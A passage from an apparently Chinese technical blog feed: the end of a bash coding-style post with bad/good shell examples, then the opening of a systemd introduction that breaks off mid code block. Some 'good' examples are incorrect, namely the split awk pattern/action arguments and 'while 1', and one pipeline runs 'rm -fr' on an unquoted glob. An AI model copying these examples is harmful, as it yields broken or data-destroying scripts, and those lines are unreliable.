d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>4.定义函数可以不用写function关键字，函数名字尽量短小无歧义，尽量传递返回值</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">function  cmd1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmd_start() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   dosomethinghere</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   return 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>5.全局变量用大写，局部变量用小写，函数内尽量不要使用全局变量，以免混淆导致变量覆盖,注意尽量使用小写表示变量</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">foo() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    a=2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo $a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">a=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo $a</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">foo(){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    a=2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo $a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">A=1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo $A</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>6.使用内建的[] 、[[]] 进行条件测试，避免使用test命令</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">test -f filename</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[ -f filename ]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[[ -n $string ]]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>7.使用$(())进行普通运算，尽量避免使用expr或其他外部命令 $[]也可用于计算</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">num=$(expr 1 + 1)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">num=$((1+1))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">num=$[1+2]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>8.管道符左右都应加空格，重定向符空格加左不加右</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find /data -name tmp*|xargs rm -fr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat a&gt;b</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find /data -name tmp* | xargs rm -fr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat a &gt;b</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>9.当<code>source</code>命令属于外部命令的时候，我们应尽量使用<code>.</code>   ，当视力不好怕写错看错的时候，应尽量不用<code>.</code>而用<code>source</code>，在实际使用中我们发现<code>.</code>号极难辨认，这里推荐使用source命令，更方便维护。</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">. func_file</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">source func_file</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>10.if 和 then 之间使用分号+空格分隔，不要用换行，书写上和c style类似：</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grep string logfile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [ $? -ne 0 ]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  dosomething</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  do something here</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">if grep string logfile; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    dosomething</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while 1; do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   do something here</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>注意;和then间有一个空格的距离</p><p>11.如果grep能直接处理文件输入那就不要和cat连用; 如果wc能直接从文件统计就不要和cat连用; 如果grep能统计行数就不要和wc连用</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat file | grep tring</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat file.list | wc -l</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grep avi av.list | wc -l</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grep tring file</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wc -l file.list</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grep -c avi av.list</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>12.如果awk的时候需要搜索恰好awk又能搜索，那么就不要再和grep连用</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dosomething | grep tring | awk '{print $1}'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dosomething | awk '/tring/' '{print $1}'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>13、尽量编写兼容旧版本shell风格且含义清晰的代码，不推荐不兼容写法或者不方便他人维护的代码</p><p>bad:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">do_some_thing |&amp; do_another_thing</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">do_some_thing &amp;&gt;&gt; some_where</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>good:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">do_some_thing 2&gt;&amp;1 | do_another_thing</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">do_some_thing &gt;some_where 2&gt;&amp;1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><strong><em>注意</em></strong> : 以上仅代表个人习惯和理解，并不能适用于所有人，适合的才是最好的。</p><p>拓展阅读文档：</p><ul><li><a href="http://kodango.me/simple-bash-programming-skills" target="_blank" rel="noopener noreferrer">http://kodango.me/simple-bash-programming-skills</a></li><li><a href="http://kodango.me/simple-bash-programming-skills-2" target="_blank" rel="noopener noreferrer">http://kodango.me/simple-bash-programming-skills-2</a></li><li><a href="http://www.commandlinefu.com/commands/browse" target="_blank" rel="noopener noreferrer">http://www.commandlinefu.com/commands/browse</a></li><li><a href="http://wiki.bash-hackers.org/scripting/style" target="_blank" rel="noopener noreferrer">http://wiki.bash-hackers.org/scripting/style</a></li></ul>]]></content>
        <category label="bash" term="bash"/>
        <category label="coding_style" term="coding_style"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Systemd基本使用介绍]]></title>
        <id>/2014/04/08/systemd-basic-usage</id>
        <link href="https://itxx00.github.io/notes/blog/2014/04/08/systemd-basic-usage"/>
        <updated>2014-04-08T00:00:00.000Z</updated>
        <content type="html"><![CDATA[<blockquote><p>但是由于计算机软硬件的不断发展，人们逐渐发现sysvinit所提供的功能已经无法满足当前的需求，服务多年的sysvinit终将过时，于是一些替代的方案开始出现，这其中包括upstart ，systemd等。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="关于pid-1">关于PID 1<a class="hash-link" href="#关于pid-1" title="标题的直接链接">​</a></h2><p>在linux的世界里，第一个启动到用户空间的进程名叫init，其pid为1，init进程启动完毕后，它相当于其他进程的根，负责将其他的服务进程启动起来，最终启动成为一个完整可用的系统。而提供这个init程序的软件名为sysvinit，它在整个linux系统中所担任的角色重要程度无可厚非。但是由于计算机软硬件的不断发展，人们逐渐发现sysvinit所提供的功能已经无法满足当前的需求，服务多年的sysvinit终将过时，于是一些替代的方案开始出现，这其中包括upstart ，systemd等。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="init的责任">init的责任<a class="hash-link" href="#init的责任" title="标题的直接链接">​</a></h2><p>为什么说sysvinit会过时呢？我们从用户需求的角度来看不难发现，其实我们对init的最原始最核心需求是，将系统从内核引导至用户空间，而由于现在硬件水平的发展，使得我们在单纯的原始需求之上产生了新的或者更多的需求，那就是不仅要引导系统，而且要快速的引导系统。而早在sysvinit诞生的那个时候启动速度的重要程度似乎不是很高，所以它在这方面显得有些老是很自然的。现在让我们继续思考一下如何才能实现快速引导。试想，当一个系统启动的时候需要启动长长的一列服务，这样的系统启动速度应该不会快到哪里去，如大多数人使用桌面系统的情况一样，一个加快系统启动速度的最直接方法就是减少启动项，把不必要的启动项禁止掉。而另外一个方法则实现起来不像第一个这么简单，那就是并行启动。并行启动可以带来的速度提升显而易见，我们只需要尽可能保证让更多的服务可以并行启动即可。而从其他方面来看sysvinit由于对脚本的依赖导致启动完毕所有服务过程中需要大量的执行外部命令，这一点也将导致引导速度的变慢。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="后起之秀">后起之秀<a class="hash-link" href="#后起之秀" title="标题的直接链接">​</a></h2><p>当一项标准已经无法满足当下发展的需求时，最好的办法是打破陈规让自己变成新的标准。systemd就是这么做的，因为现实的需要它已经不能顾及POSIX标准了，以不至于阻碍其更好的发展，而systemd在设计之初也和苹果的launchd在某些地方不谋而合。尽管在最初的时候这种做法没有得到所有人的认可甚至是惹恼了一些家伙，但是现在看来systemd已经成为了事实上的标准了，现在已经采用systemd的发行版有fedora，opensuse，debian，ubuntu，rhel7，archlinux等，尽管在systemd的推广过程中发生了很多曲折，但最终大家的选择是一致的---朝着更好的方向发展而不是墨守陈规。
在功能上，systemd不仅仅是解决了现有程序的种种问题，而且包含了大量新的特性，这意味着系统中原本需要的很多组件现在也都可以下岗了，下面来看看systemd的一些特性：</p><ul><li>服务管理 - 提供了统一的启动/停止/重启/重载 而不再需要编写一大坨脚本来干这种原本就应该十分简单基本且重要的事情，取而代之的是更为简洁的配置文件，这也表示今后的系统中各种service启动控制的统一性，使得daemon服务开发者免于编写各种看上去参差不齐的启动脚本，增加了通用性。</li><li>socket管理 - 支持监听socket，这使得socket的监听和服务本身可以相互独立，一方面可以以此提高服务启动速度，另外一方面还可以节约系统开销。</li><li>设备管理 - 可以配合udev规则对设备进行管理，还可以配合/etc/fstab文件实现磁盘的挂载管理，甚至实现更高级的自动挂载；</li><li>target分组 - 把不同的unit组合起来，组合到同一个target里面，完全取代sysvinit的运行等级的概念；</li><li>状态快照 - 可以对当前系统中的unit状态进行快照，这个概念有些类似于系统的休眠与恢复，你可以让系统从一个状态切换进入另外一个状态；</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="systemd管理入门">systemd管理入门<a class="hash-link" href="#systemd管理入门" title="标题的直接链接">​</a></h2><p>下面我们将通过一些例子来演示一些基本的管理命令，这些命令对于系统管理员来说至关重要。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1--如何检查启动项">1  如何检查启动项<a class="hash-link" href="#1--如何检查启动项" title="标题的直接链接">​</a></h3><p>任何启动项，只要是在系统启动时有被执行到，不论启动成功还是失败，systemd都能够记录下他们的状态，直接执行不带参数的systemctl命令即可观察到，如下：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" 